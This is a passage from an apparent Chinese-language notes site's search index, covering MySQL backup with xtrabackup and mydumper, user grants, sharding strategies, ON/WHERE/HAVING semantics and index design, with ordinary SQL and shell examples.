xtrabackup：是用于热备innodb，xtradb表中数据的工具，不能备份其他类型的表，也不能备份数据表结构； innobackupex：是将xtrabackup进行封装的perl脚本，提供了备份myisam表的能力。 常用选项: --host     指定主机\n--user     指定用户名\n--password    指定密码\n--port     指定端口\n--databases     指定数据库\n--incremental    创建增量备份\n--incremental-basedir   指定包含完全备份的目录\n--incremental-dir      指定包含增量备份的目录\n--apply-log        对备份进行预处理操作\n                    一般情况下，在备份完成后，数据尚且不能用于恢复操作，因为备份的数据中可能会包含尚未提交的事务或已经提交但尚未同步至数据文件中的事务。因此，此时数据文件仍处理不一致状态。\"准备\"的主要作用正是通过回滚未提交的事务及同步已经提交的事务至数据文件也使得数据文件处于一致性状态。\n--redo-only      不回滚未提交事务\n--copy-back     恢复备份目录 增量备份,\n基于全量备份的增量备份与恢复 做一次增量备份（基于当前最新的全量备份）: innobackupex --user=$user --password=$password --defaults-file=$mysqld_cnf_file --incremental /backups/ --incremental-basedir=$whole_bak_dir 准备基于全量: innobackupex --user=$user --password=$password --defaults-file=$mysqld_cnf_file --apply-log --redo-only $whole_bak_dir 准备基于增量: innobackupex --user=$user --password=$password --defaults-file=$mysqld_cnf_file --apply-log --redo-only $whole_bak_dir --incremental-dir=$increase_dir 增量备份恢复: innobackupex --copy-back --defaults-file=$mysqld_cnf_file $bak_dir 解释: $whole_bak_dir\n  指的是完全备份所在的目录。\n$increase_dir\n  指定是第一次基于 $whole_bak_dir 增量备份的目录，\n  其他类似以此类推，即如果有多次增量备份。每一次都要执行如上操作。 注解 增量备份仅能应用于InnoDB或XtraDB表，对于MyISAM表而言，执行增量备份时其实进行的是完全备份。 此节参考: xtrabackup的配置使用 其他工具-MyDumper 相对于 MySQL 官方提供的逻辑备份工具 mysqldump,\nmydumper 最突出的特性就是可采用多线程并行备份，极大提高了数据导出的速度。 使用: mydumper -h $host -u $user -p $password --database $db --tables-lists $tables --compress --threads 4 --outputdir $path\n\n# 少一个  --tables-lists $tables 就是全库备份\nmydumper -h $host --database $db --compress --threads 4 --outputdir $path --defaults-file=$passfile -c , --compress 压缩输出文件 -m , --no-schemas 不导出表结构 -t , --threads 使用的线程数量 -F , --chunk-filesize 将表数据分割成这个输出大小的块，单位默认是MB","tags":"数据库","url":"/yq-docs-database-mysql-MySQL-backup-solution.html","loc":"/yq-docs-database-mysql-MySQL-backup-solution.html"},{"title":"查询选项","text":"union 去重查询 union all     不去重查询 distinct      字段去重 非交互式查询 命令行直接查询: # 如果是文件\nmysql -u $user -p $pass < $file.sql\n# 不是文件\necho \"$sql\" | mysql -u $user -p$pass 如果把账号密码放到一个文件: # pwd.cnf\n[client]\nuser=root\npassword=root 命令行直接查询: # 如果是sql语句文件\nmysql --defaults-extra-file=pwd.cnf < $file.sql\n# 如果不是\necho \"$sql\" | mysql --defaults-extra-file=pwd.cnf 空间占用查询 查询所占空间: select\n  table_schema as '数据库',\n  sum(table_rows) as '记录数',\n  sum(truncate(data_length/1024/1024, 2)) as '数据容量(MB)',\n  sum(truncate(index_length/1024/1024, 2)) as '索引容量(MB)'\nfrom information_schema.tables\nwhere table_schema='mysql'; 使用optimize命令查询空间占用: optimize table tb_report_inventory; 注解 使用的时间比较长，需要耐心等待。 optimize执行时会将表锁住，所以不要在高峰期使用。也不要经常使用，每月一次就足够了 查询数据库连接 SQL: show processlist; 显示当前正在执行的进程或会话的列表以及与每个进程相关的一些信息.\n会返回一个结果集，其中包含以下信息： Id 表示连接的唯一标识符。 User 表示连接使用的数据库用户。 Host 表示连接的主机名或 IP 地址。 db 表示连接当前正在使用的数据库。 Command 表示连接正在执行的 SQL 命令类型，如 Query、Sleep、Binlog Dump 等。 Time 表示连接已经执行的时间（以秒为单位）。 State 表示连接的当前状态，如 Running、Locked、Sending data 等。 Info 表示连接当前正在执行的 SQL 语句或操作的描述。 监视数据库连接和识别潜在问题非常有用 mysql8.0下实际使用记录 创建用户: create user 'username'@'%' identified by 'password';\n\nusername      用户名\n%     主机名，本机可用localhost，%表示所有（通配符） 查看用户权限: show grants for username@localhost; 为username@localhost赋予超级用户权限: grant all privileges on *.* to username@localhost with grant option;\n\ngrant 授权\nall privileges        所有权限\non *.*        所有数据库，所有表\nto username@localhost 哪个用户的哪个主机\nwith grant option     是否将username自身的权限赋予其他账户 普通用户权限添加: grant usage,select,insert,update,delete,create temporary tables,execute on jikedb.* to username@localhost; //此时没有with grant option 表示不给其他用户赋权限\nflush privileges;\n\nusage:无权限，当你想创建一个没有权限的用户时候，指定usage\nshow:的权限\nview:视图的权限(mysql8.0+赋权限出错)ERROR 3619 (HY000): Illegal privilege level specified for VIEW\ncreate temporary tables:创建临时表的权限\nexcute：执行的权限 收回权限: revoke delete on jikedb.* from username@localhost;\n# 意思是收回username@localhost下jikedb库所有的表的删除操作 新创建的用户username@localhost 要想使用，登录后需要修改密码: alter user username@localhost identified by '12345678' 删除用户: drop user username@localhost; //username，localhost加不加引号都可 有时候需要重载一下表数据: grant reload on *.* to username@'%'; 实际使用2-表的创建修改 创建t1表: mysql> create table t1(id int primary key, name varchar(255), age int);\nQuery OK, 0 rows affected (0.03 sec) 查看创建语句: mysql> show create table t1 \\G;\n*************************** 1. row ***************************\n      Table: t1\nCreate Table: CREATE TABLE `t1` (\n  `id` int NOT NULL,\n  `name` varchar(255) DEFAULT NULL,\n  `age` int DEFAULT NULL\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci\n1 row in set (0.00 sec)\n\nERROR:\nNo query specified 修改表, 增加一个birth字段: mysql> alter table t1 add birth datetime;\nQuery OK, 0 rows affected (0.03 sec)\nRecords: 0  Duplicates: 0  Warnings: 0 查看: mysql> show create table t1 \\G;\n*************************** 1. row ***************************\n      Table: t1\nCreate Table: CREATE TABLE `t1` (\n  `id` int NOT NULL,\n  `name` varchar(255) DEFAULT NULL,\n  `age` int DEFAULT NULL,\n  `birth` datetime DEFAULT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci\n1 row in set (0.00 sec)\n\nERROR:\nNo query specified 其他 select into 写入文件 常用语句(有些上面有了): select\n                    now()             查看当前时间\n                    database()        查看当前数据库\n                    version()         查看数据库版本\n                    user()            查看当前登录的数据库用户\n\n                    sleep(n)           睡眠 n 秒\n                    substr(a, b, c)    对于a字符串，b位置开始，截取长度c的字符\n                    count()            计算总数\n                    ascii(a)           字符a的ascii码\n                    length(a)          字符串a的长度\n\n            # 查询数据库版本\n            select version();\n\n            # 使用指定的数据库\n            use $database_name;\n\n            # 查看指定表信息 这个好像在8.0有问题...\n            # show table $table_name\n\n            # 查看指定表的结构\n            show create table $table_name\n\n            # 查看指定表的索引\n            show index from $table_name\n\n            # 删除表 多个逗号隔开, drop table 单个也可\n            drop tables $table_name;\n\n            # 查看SQL查询计划\n            EXPLAIN 加数据库语句\n\n            # 查看各种优化参数开关\n            select @@optimizer_switch;\n            # 在会话级别设置查询优化器可以看到隐藏索引,\n            # use_invisible_indexes 可以通过上面的 optimizer_switch 看到\n            set session optimizer_switch=\"use_invisible_indexes=on\";\n\n            # 开启一个事务\n            # begin;\n\n# 删除外键约束\nDROP FOREIGN KEY <外键约束名>\n\n# 查看所有触发器\nshow triggers\\G; mysql命令: -h host         链接到指定的主机\n-u user         用户\n-p password     密码","tags":"数据库","url":"/yq-docs-database-mysql-Query-option.html","loc":"/yq-docs-database-mysql-Query-option.html"},{"title":"分库分表","text":"具体情况具体分析,\n合理选择策略. 注解 还有 NewSQL 的 单机 到 分布式集群, 不属于分库分表,\n而是直接就实现了分布式 分库分表算是一个轻量级的优化解决方案 分库: 将数据分离多个库, 解放数据库IO性能 分表: 将数据分离多个表, 突破单表数据压力 注解 这里提一句, 还有其他优化方案, 比如使用 主从架构 (binlog) 实现 读写分离 业务代码层面, 读写分离只关注路由到读的库, 还是写的库. 分库分表方案 数据分片 常见策略 取模分片。优点：数据存放均匀。缺点：扩容需要大量数据迁移。 按范围分片。优点：扩容不需要迁移数据。缺点：数据存放不均匀，容易产生数据倾斜(比如按月份分, 某月的数据过多, 另一月内数据又过少)。 配置路由, 比如将路由配置信息写到路由表; 缺点是得多查询一次, 以及数据量大时候又回陷入分表循环; 根据业务场景，灵活定制分片策略。--面试重点 垂直拆分 垂直分片： 从业务维度切分扩展数据库连接数 提升数据库IO性能 把单库中的不同表分到不同的库,\n再深入点, 把单表的列拆分给多个表 水平拆分 水平分片： 从数据维度切分扩展单表可控数据量 提升数据库查询性能 水平分片从理论上突破了单机数据量处理的瓶颈，并且扩展相对自由，是分库分表的标准解决方案。 如 比如按日期拆分(范围分表), 那在WEB应用的角度怎么查? 可以按照时间, 2021年的查2021年的表... Hash分表 其实就是上面的取模策略. 查id, id计算hash后对多少(比如拆为4张表)取余, 然后决定去哪个表查. 但是有个缺点, 后续如果再拆4个表, 加起来一共八个, 之前的逻辑的混乱了.\n所以还要作数据迁移 无热点问题, 但是扩容迁移麻烦. 范围分表 时间分表就是, 比如 1000-2000 w数据在第2张表. 存在热点问题. 比如同时并发在某一个表. 分库分表后如何实现不停机扩容 实际上，不停机扩容，实操起来是个非常麻烦而且很有风险的操作，\n当然，面试回答起来就简单很多。 第一阶段：在线双写，查询走老库 建立好新的库表结构，数据写入老库的同时，也写入拆分的新库 数据迁移，使用数据迁移程序，将旧库中的历史数据迁移到新库 使用定时任务，新旧库的数据对比，把差异补齐 第二阶段：在线双写，查询走新库 完成了历史数据的同步和校验 把对数据的读切换到新库 第三阶段：旧库下线 旧库不再写入新的数据 经过一段时间，确定旧库没有请求之后，就可以下线老库 分库分表问题 从分库的角度来讲 事务的问题 使用关系型数据库，君很大一点在于它保证事务完整性。 而分库之后单机事务就用不上了，必须使用分布式事务来解决。 跨库 JOIN 问题 在一个库中的时候我们还可以利用JOIN 来连表查询，而跨库了之后就无法使用JOIN 了 此时的解决方案就是在业务代码中进行关联，也就是先把一个表的数据查出来，\n然后通过得到的结果再去查另一张表，然后利用代码来关联得到最终的结果。 这种方式实现起来稍微比较复杂，不过也是可以接受的。 还有可以适当的冗余一些字段。比如以前的表就存储一个关联 ID，但是业务时常要求返回对应的 Name 或者其他字段。\n这时候就可以把这些字段冗余到当前表中，来去除需要关联的操作。 还有一种方式就是数据异构，通过binlog同步等方式，把需要跨库join的数据同步到ES的大宽表里去，通过ES直接查询，效率很高。 从分表的角度来看 跨节点的 count,order by.group by 以及聚合函数问题 只能由业务代码来实现或者用中间件将各表中的数据汇总、排序、分页然后返回。 数据迁移，容量规划，扩容等问题 数据的迁移，容量如何规划，未来是否可能再次需要扩容，等等，都是需要考虑的问题。 ID 问题 数据库表被切分后，不能再依赖数据库自身的主键自增生成机制，所以需要一些手段来保证全局主键唯一。\n即 案例-主键冲突 还是自增，只不过自增步长设置一下。比如现在有三张表，步长设置为3，\n三张表ID 初始值分别是1、2、3。\n这样第一张表的ID增长是1、4、7。第二张表是2、5、8。第三张表是3、6、9，这样就不会重复了。 UUID，这种最简单，但是不连续的主键插入会导致严重的页分裂，性能比较差。 分布式ID，比较出名的就是 Twitter 开源的 sonwflake 雪花算法 案例-主键冲突 数据库一般使用整型自增主键,\n那么当进行分库分表时,\n新的表也是需要主键索引的, 这个时候就会有主键冲突,\n如何解决? 有个自定义主键, 雪花 算法,\n它让主键只是保持一个增加的趋势,\n具体怎么实现的, 后面再研究. 案例-多数据源, 分布式事务问题 分库分表开源框架 ShardingSphere分库分表 京东开源 地址: Apache ShardingSphere 支持: ShardingJDBC: 客户端分库分表 ShardingProxy: 服务端分库分表 实际使用方面来看, 实现是通过配置把多个表、库整合为一个逻辑表、库 支持策略 Inline策略 - 根据单一分片键进行精确分片;\n如\nSQL: Insert into course values (?,?,?,?)\nSelect * from course where cid = ?\nSelect * from course where cid in ? 注: 此处cid是由雪花算法生成的主键id 分片键: cid尽量不要用id，MyBatis会对id字段默认生成雪花主键 分片算法: m$->{cid%2+1}.course_$-> I ((cid+1) %4).intdiv(2) +1} 真实节点: m$->{1.. 2}.course_$->{1.. 2} Standard策略 - 根据单一分片键进行精确或者范围分片; 如SQL: Select * from course where cid between ? and ? 分片键: cid 分片算法: Precise algorithm + Range algorithm 真实节点: m$->{1.. 2}.course_$->{1.. 2} Complex策略 - 根据多个分片键进行精确或者范围分片; Hint策略 - 使用与SQL无关的方式进行分片;\n如查询的cid是奇数 其他: 支持读写分离下的策略配置 案例举例 案例-不同用户端优化 说明: 主要是运营管理端, 如果需要实时可以用es, es中可以只存相关关键查询字段和主键\n然后再拿主键去数据库拿. 案例-线上单库不停机迁移 先考虑停机迁移, 可以直接整库迁移, 或者每次迁移1k数据等 但是如果是线上迁移, 期间可能会有业务数据更新. 方案一: 监听binlog binlog记录了对数据库的修改,\n阿里有个开源的 canal 组件 , 可以做到监听binlog 然后把binlog的变动解析出来写到新库表.\n但是得考虑, 如果监听binlog写到新库表要比迁移的快, 就会造成数据混乱.\n解决方案就是用版本啊, 重试机制啥的 迁移后也不能马上全部拿去用,\n而是 灰度发布 , 先给部分服务器用.\n灰度的周期一般比较短, 因为期间可能有分流的问题,\n比如更新的新表, 但是有查询旧表...","tags":"数据库","url":"/yq-docs-database-mysql-Sub--meter.html","loc":"/yq-docs-database-mysql-Sub--meter.html"},{"title":"on、where、Having的区别","text":"注解 连接查询参考: 表内外连接 WHERE与HAVING WHERE子句在GROUP BY分组和聚合函数之前对数据行进行过滤； HAVING子句对GROUP BY分组和聚合函数之后的数据行进行过滤。 因此，WHERE子句中不能使用聚合函数。例如，以下语句将会返回错误: -- 查找人数大于 5 的部门\nselect dept_id, count(*)\nfrom employee\nwhere count(*) > 5\ngroup by dept_id; 因为在执行WHERE子句时，还没有计算count 另一方面，HAVING子句中不能使用除了分组字段和聚合函数之外的其他字段。例如，以下语句将会返回错误: -- 统计每个部门月薪大于等于 30000 的员工人数\nselect dept_id, count(*)\nfrom employee\ngroup by dept_id\nhaving salary >= 30000; 因为经过GROUP BY分组和聚合函数之后，不再存在 salary 字段，HAVING子句中只能使用分组字段或者聚合函数 从性能的角度来说，HAVING子句中如果使用了 分组字段 作为过滤条件，应该替换成WHERE子句；\n因为WHERE可以在执行分组操作和计算聚合函数之前过滤掉不需要的数据，性能会更好。\n下面示例中的语句 1 应该替换成语句 2: -- 语句 1\nselect dept_id, count(*)\nfrom employee\ngroup by dept_id\nhaving dept_id = 1;\n\n-- 语句 2\nselect dept_id, count(*)\nfrom employee\nwhere dept_id = 1\ngroup by dept_id; 当然，WHERE和HAVING可以组合在一起使用。例如: select dept_id, count(*)\nfrom employee\nwhere salary > 10000\ngroup by dept_id\nhaving count(*) > 1;\n\ndept_id|count(*)|\n-------|--------|\n      1|       3| 该语句返回了月薪大于 10000 的员工人数大于 1 的部门；\nWHERE用于过滤月薪大于 10000 的员工；HAVING用于过滤员工数量大于 1 的部门。 WHERE 与 ON 当查询涉及多个表的关联时，我们既可以使用WHERE子句也可以使用ON子句指定连接条件和过滤条件。这两者之间的主要区别在于： 对于内连接（inner join）查询，WHERE和ON中的过滤条件等效； 对于外连接（outer join）查询，ON中的过滤条件在连接操作之前执行，\nWHERE中的过滤条件（逻辑上）在连接操作之后执行。 条件查询内连接 对于内连接查询而言，以下三个语句的结果相同: -- 语句 1\nselect d.dept_name, e.emp_name, e.sex, e.salary\nfrom employee e, department d\nwhere e.dept_id = d.dept_id\nand e.emp_id = 10;\n\ndept_name|emp_name|sex|salary |\n---------|--------|---|-------|\n研发部   |廖化    |男  |6500.00|\n\n-- 语句 2\nselect d.dept_name, e.emp_name, e.sex, e.salary\nfrom employee e\njoin department d on (e.dept_id = d.dept_id and e.emp_id = 10);\n\ndept_name|emp_name|sex|salary |\n---------|--------|---|-------|\n研发部   |廖化    |男  |6500.00|\n\n-- 语句 3\nselect d.dept_name, e.emp_name, e.sex, e.salary\nfrom employee e\njoin department d on (e.dept_id = d.dept_id)\nwhere e.emp_id = 10;\n\ndept_name|emp_name|sex|salary |\n---------|--------|---|-------|\n研发部   |廖化    |男  |6500.00| 语句 1 在WHERE中指定连接条件和过滤条件；语句 2 在ON中指定连接条件和过滤条件；\n语句 3 在ON中指定连接条件，在WHERE中指定其他过滤条件。\n上面语句不但结果相同，数据库的执行计划也相同。以 MySQL 为例，以上语句的执行计划如下: id|select_type|table|partitions|type |possible_keys       |key    |key_len|ref  |rows|filtered|Extra|\n--|-----------|-----|----------|-----|--------------------|-------|-------|-----|----|--------|-----|\n1|SIMPLE     |e    |          |const|PRIMARY,idx_emp_dept|PRIMARY|4      |const|   1|     100|     |\n1|SIMPLE     |d    |          |const|PRIMARY             |PRIMARY|4      |const|   1|     100|     | 尽管如此，仍然建议将两个表的连接条件放在ON子句中，将其他过滤条件放在WHERE子句中；\n这样语义更加明确，更容易阅读和理解。对于上面的示例而言，推荐使用语句 3 的写法。 条件查询外连接 对于外连接而言，连接条件只能用ON子句表示，因为WHERE子句无法表示外连接的语义。例如: select d.dept_name, e.emp_name, e.sex, e.salary\nfrom department d\nleft join employee e on (e.dept_id = d.dept_id)\nwhere d.dept_name = '保卫部';\n\ndept_name|emp_name|sex|salary|\n---------|--------|---|------|\n保卫部   |        |   |      | 由于\"保卫部\"没有员工，我们需要使用外连接返回部门的信息；\nWHERE条件用于过滤 dept_id = 6 的数据；此时，员工表中返回的都是 NULL。 注解 Oracle 支持在WHERE子句的右/左侧使用 (+) 表示左/右外连接，但是无法表示全外连接。 对于以上语句，如果将WHERE子句中的过滤条件放到ON子句中，结果将会完全不同: select d.dept_name, e.emp_name, e.sex, e.salary\nfrom department d\nleft join employee e on (e.dept_id = d.dept_id and d.dept_name = '保卫部');\n\ndept_name|emp_name|sex|salary|\n---------|--------|---|------|\n行政管理部|        |   |      |\n人力资源部|        |   |      |\n财务部   |        |   |      |\n研发部   |        |   |      |\n销售部   |        |   |      |\n保卫部   |        |   |      | 左外连接返回了所有的部门信息，而且员工信息都为 NULL；\n显然，这不是我们期望的结果。我们可以通过执行计划分析一下为什么会这样，\n仍然以 MySQL 为例: explain analyze\nselect d.dept_name, e.emp_name, e.sex, e.salary\nfrom department d\nleft join employee e on (e.dept_id = d.dept_id and d.dept_name = '保卫部');\n\n-> Nested loop left join  (cost=7.60 rows=30) (actual time=0.098..0.278 rows=6 loops=1)\n    -> Table scan on d  (cost=0.85 rows=6) (actual time=0.052..0.057 rows=6 loops=1)\n    -> Filter: (d.dept_name = '保卫部')  (cost=0.71 rows=5) (actual time=0.035..0.035 rows=0 loops=6)\n        -> Index lookup on e using idx_emp_dept (dept_id=d.dept_id)  (cost=0.71 rows=5) (actual time=0.020..0.032 rows=4 loops=6) 查询计划显示使用 Nested loop left join 方式执行连接操作；\n对于 department 使用全表扫描的方式返回 6 行记录；\n对于 employee 表采用索引（idx_emp_dept）查找，\n同时使用\"d.dept_name = '保卫部'\"作为过滤条件，循环 6 次返回了 0 行记录；\n最终返回了上面的结果。 作为对比，我们可以看看将过滤条件放到WHERE子句时的执行计划: explain analyze\nselect d.dept_name, e.emp_name, e.sex, e.salary\nfrom department d\nleft join employee e on (e.dept_id = d.dept_id)\nwhere d.dept_name = '保卫部';\n\n-> Nested loop left join  (cost=1.98 rows=5) (actual time=0.074..0.078 rows=1 loops=1)\n    -> Filter: (d.dept_name = '保卫部')  (cost=0.85 rows=1) (actual time=0.049..0.053 rows=1 loops=1)\n        -> Table scan on d  (cost=0.85 rows=6) (actual time=0.039..0.047 rows=6 loops=1)\n    -> Index lookup on e using idx_emp_dept (dept_id=d.dept_id)  (cost=1.12 rows=5) (actual time=0.021..0.021 rows=0 loops=1) 查询计划显示使用 Nested loop left join 方式执行连接操作；\n对于 department 通过扫描返回 1 行记录（d.dept_name = '保卫部'）；\n对于 employee 表采用索引（idx_emp_dept）查找，\n同时使用 dept_id=d.dept_id 作为过滤条件，循环 1 次返回了 0 行记录。 注解 一般来说，对于左外连接查询，左表的过滤应该使用WHERE子句，\n右表的过滤应该使用ON子句；右外连接查询正好相反；全外连接的过滤条件使用ON子句。 在使用jion时，on和where条件的区别如下： on 条件是在生成临时表时使用的条件，返回on条件匹配的记录。 where 条件是在临时表生成好后，再对临时表进行过滤的条件。\n这时已经没有left join的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。 on、where、having这三个都可以加在条件的子句中，on是最先执行，where次之，having最后。 对于内连接，inner join（inner join即join）和 = 等号结果一样，但实现原理完全不同，\njoin是基于hashtable连接比较，\n而=直接就是取笛卡尔集再过滤，所以后者效率低，是O(N&#94;2)，前者是O(LogN)。 注解 笛卡尔集, 就是一个表的所有行跟另一个表的所有行全连接 参考: 【MySQL】连接查询 以及 on、where、Having的区别","tags":"数据库","url":"/yq-docs-database-mysql-The-difference-between-on,-where,-having.html","loc":"/yq-docs-database-mysql-The-difference-between-on,-where,-having.html"},{"title":"索引","text":"数据结构实现 见: 索引数据结构 索引分类 数据结构角度 B+ Hash FULL TEXT 物理存储角度 聚簇索引 非聚簇索引 逻辑角度 主键索引(Primary Key): 也叫 聚集索引, 聚簇索引, 是特殊的唯一索引, 不允许空;\nInnoDB存储引擎的表会存在主键（唯一非null），如果建表的时候没有指定主键，\n则会使用第一非空的唯一索引作为聚集索引，\n否则InnoDB会自动帮你创建一个不可见的、长度为6字节的row_id用来作为聚集索引。 唯一索引(Unique): 索引列值惟一, 允许空;\n索引列的值必须唯一，但允许有空值; 单列索引(Key): 也叫普通索引, 一个索引只包含单个列;\n是MySQL中的基本索引类型，允许在定义索引的列中插入重复值和空值; 多列索引: 也叫组合索引;\n组合索引指在表的多个字段组合上创建的索引，\n列值的组合必须唯一,\n只有在查询条件中使用了这些字段的左边字段时，\n索引才会被使用。使用组合索引时 遵循最左前缀集合 ; 全文索引(FULLTEXT): 全文索引类型为FULLTEXT，在定义索引的列上支持值的全文查找，\n允许在这些索引列中插入重复值和空值。全文索引可以在CHAR、VARCHAR或者TEXT类型的列上创建 注意搜索长度有默认值，参考: MySQL 之全文索引 空间索引(SPATIAL): 空间索引是对空间数据类型的字段建立的索引，\nMySQL中的空间数据类型有4种，分别是GEOMETRY、POINT、LINESTRING和POLYGON。\nMySQL使用SPATIAL关键字进行扩展，使得能够用于创建正规索引类似的语法创建空间索引。\n创建空间索引的列必须声明为NOT NULL 注解 遵循最左前缀集合 order by使用索引最左前缀: order by a\norder by a,b\norder by a,b,c\norder by a desc, b desc, c desc 如果where使用索引的最左前缀定义为常量，则order by能使用索引: where a=const order by b,c\nwhere a=const and b=const order by c\nwhere a=const and b > const order by b,c 不能使用索引进行排序: order by a , b desc ,c desc  --排序不一致\nwhere d=const order by b,c   --a丢失\nwhere a=const order by c     --b丢失\nwhere a=const order by b,d   --d不是索引的一部分\nwhere a in(...) order by b,c --a属于范围查询 说明,\n当创建一个简单的表: CREATE TABLE my_test (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `username` varchar(50) DEFAULT NULL,\n  `sex` varchar(5) DEFAULT NULL,\n  `address` varchar(100) DEFAULT NULL,\n  `birthday` datetime NOT NULL,\n  `user_num` int(11) unique,\n  PRIMARY KEY (`id`),\n  index(username)\n); 会发现明明在建表的时候只创建了一个索引，查询出来的有三个: show index from my_test; 其实 主键，唯一约束列，外键 这些都自动会生成索引，至于外键大家可以去尝试下 注解 上表格中各个列的说明: table #表名称\nnon_unique  #如果索引不能包括重复词，为0，如果可以，则为1\nkey_name  #索引的名称\nseq_in_index #索引中的列序号\ncolumn_name  #列名称\ncollation  #列以什么方式存储在索引中，在mysql中，有值'A'（升序）或者NULL（无分类）\ncardinality  #索引在唯一值的数据的估值，通过运行analyze table xxx_table;或者 myisamchk -a 可以更新，技术根据被存储为整数的统计数据来计数，所以即使对于小型表，该值也没必要是精确的，基数越大，当进行联合所饮食，mysql使用该索引的机会越大。myisam中，该值是准确的，INNODB中该值数据是估算的，存在偏差\nsub_part  #如果列只是部分的编入索引 则为被编入索引的字符的数目，如果整列被编入索引，则为NULL\npacked  #指示关键词如何被压缩，如果没有被压缩，则为NULL\nNULL   #如果列含有NULL，则含有YES，如果没有，则该列为NO\nindex_type  #用过的索引方法（BTREE,FULLTEXT,HASH,RTREE）\ncomment  #备注\nindex_comment  #为索引创建时提供了一个注释属性的索引的任何评论 创建索引注意点 索引应该建在查询应用频繁的字段，比如whelre判断、order 排序和join 的（on）字段上创建索引。 索引的个数应该适量，索引需要占用空间，更新时候也需要维护; 一个表中如果有大量的索引，不仅占用磁盘空间，而且会影响INSERT、DELETE、UPDATE等语句的性能，\n因为在表中的数据更改的同时，索引也会进行调整和更新; 区分度低的字段，例如性别，不要建索引。 频繁更新的值，不要作为索引，维护索引文件需要成本；还会导致页分裂，I0次数增多。 联合索引把散列性高（区分度高）的值放在前面为了更好的满足最左前缀匹配原则 尽可能用联合索引代替多个单列索引\n（对于单列索引，MySQL基本只能使用一个索引，所以经常使用多个条件查询时更适合使用联合索引）\n过长的字段，使用前缀索引。当字段值比较长的时候，建立索引会消耗很多的空间，搜索起来也会很慢。\n我们可以通过截取字段的前面一部分内容建立索引，这个就叫前缀索引。 不建议用无序的值（例如身份证、UUID）作为索引，在插入时会造成叶子节点频繁分裂，出现磁盘存储的碎片化 数据量小的表最好不要使用索引，由于数据较少，查询花费的时间可能比遍历索引的时间还要短，索引可能不会产生优化效果; 当唯一性是某种数据本身的特征时(比如下单日期可以)，指定唯一索引。使用唯一索引需能确保定义的列的数据完整性，以提高查询速度; 搜索的索引列，不一定是所要选择的列;\n换句话说，最适合索引的列是出现在WHERE子句中的列，或连接子句中指定的列，而不是出现在SELECT关键字后的选择列表中的列; 使用短索引; 如果对字符串列进行索引，应该指定一个前缀长度，只要有可能就应该这样做;\n例如，有一个CHAR(200)列，如果在前10个或20个字符内，多数值是唯一的，那么就不要对整个列进行索引;\n对前10个或20个字符进行索引能够节省大量索引空间，也可能会使查询更快;\n较小的索引涉及的磁盘 IO 较少，较短的值比较起来更快;\n更为重要的是，对于较短的键值，索引高速缓存中的块能容纳更多的键值，\n因此，MySQL 也可以在内存中容纳更多的值。这样就增加了找到行而不用读取索引中较多块的可能性; 对于InnoDB存储引擎的表，记录默认会按照一定的顺序保存; 如果有明确定义的主键，则按照主键顺序保存; 如果没有主键，但是有唯一索引，那么就是按照唯一索引的顺序保存; 如果既没有主键又没有唯一索引，那么表中会自动生成一个内部列，按照这个列的顺序保存; 按照主键或者内部列进行的访问是最快的，所以InnoDB表尽量自己指定主键，\n当表中同时有几个列都是唯一的，都可以作为主键的时候，\n要选择最常作为访问条件的列作为主键，提高查询的效率;\n另外，还需要注意，InnoDB 表的普通索引都会保存主键的键值，\n所以主键要尽可能选择较短的数据类型，可以有效地减少索引的磁盘占用，提高索引的缓存效果 创建索引 显示索引信息: # SHOW INDEX 命令\nmysql> SHOW INDEX FROM table_name\\G 几种方式通过修改表结构增加索引: # 添加一个主键，这意味着索引值必须是唯一的，且不能为NULL\nALTER TABLE tbl_name ADD PRIMARY KEY (column_list);\n\n# 创建索引的值必须是唯一的（除了NULL外，NULL可能会出现多次）\nALTER TABLE tbl_name ADD UNIQUE index_name (column_list);\n\n# 添加普通索引，索引值可出现多次\nALTER TABLE tbl_name ADD INDEX index_name (column_list);\n\n# 指定了索引为 FULLTEXT ，用于全文索引\nALTER TABLE tbl_name ADD FULLTEXT index_name (column_list) 使用 ALTER 命令添加和删除主键: mysql> ALTER TABLE testalter_tbl MODIFY i INT NOT NULL;\nmysql> ALTER TABLE testalter_tbl ADD PRIMARY KEY (i);\n\n# 删除主键时只需指定PRIMARY KEY，但在删除索引时，你必须知道索引名。\nmysql> ALTER TABLE testalter_tbl DROP PRIMARY KEY; 普通索引 这是最基本的索引，它没有任何限制。它有以下几种创建方式: CREATE INDEX indexName ON table_name (column_name) 如果是CHAR，VARCHAR类型，length可以小于字段实际长度；\n如果是BLOB和TEXT类型，必须指定 length。 修改表结构(添加索引): ALTER table tableName ADD INDEX indexName(columnName) 创建表的时候直接指定: CREATE TABLE mytable(\n  ID INT NOT NULL,\n  username VARCHAR(16) NOT NULL,\n  INDEX [indexName] (username(length))\n); 删除索引的语法: DROP INDEX [indexName] ON mytable; 唯一索引 创建: CREATE UNIQUE INDEX indexName ON mytable(username(length)) 修改表结构: ALTER table mytable ADD UNIQUE [indexName] (username(length)) 创建表的时候直接指定: CREATE TABLE mytable(\n  ID INT NOT NULL,\n  username VARCHAR(16) NOT NULL,\n  UNIQUE [indexName] (username(length))\n); 索引失效 查询条件包含or，可能导致索引失效 如果字段类型是字符串，where时一定用引号括起来，否则会因为隐式类型转换，索引失效 like通配符可能导致索引失效。 联合索引，查询时的条件列不是联合索引中的第一个列，索引失效。 在索引列上使用mysql的内置函数，索引失效。 对索引列运算（如，+、一、 * 1，索引失效。 索引字段上使用（！=或者<>，not in）时，可能会导致索引失效。 索引字段上使用is null，is not null，可能导致索引失效。 左连接查询或者右连接查询查询关联的字段编码格式不一样，可能导致索引失效。 MySQL优化器估计使用全表扫描要比使用索引快，则不使用索引。","tags":"数据库","url":"/yq-docs-database-mysql-index.html","loc":"/yq-docs-database-mysql-index.html"},{"title":"其他问题","text":"联合索引的实现 按照每一个索引的顺序来进行排序,\n如 (A, B, C) , 先按A排序,\nA相等就看B,\n要是ABC都相等, 就看主键 创建联合索引: KEY `idx_name_age_position` (`name`, `age`, `position`) USING BTREE 如何查询SQL执行计划 EXPLAIN 加 数据库语句 一些原则 高并发场景下, 数据库尽量不要多表关联,\n比如阿里就禁止超过三张表的JOIN 因为会降低DB性能 对于高并发来说, DB卡死, 基本上依赖这个DB的都会被影响, 大部分都是采取, 将数据的整合转移到WEB应用上去,\n因为WEB有瓶颈了, 扩容WEB就行等... binlog 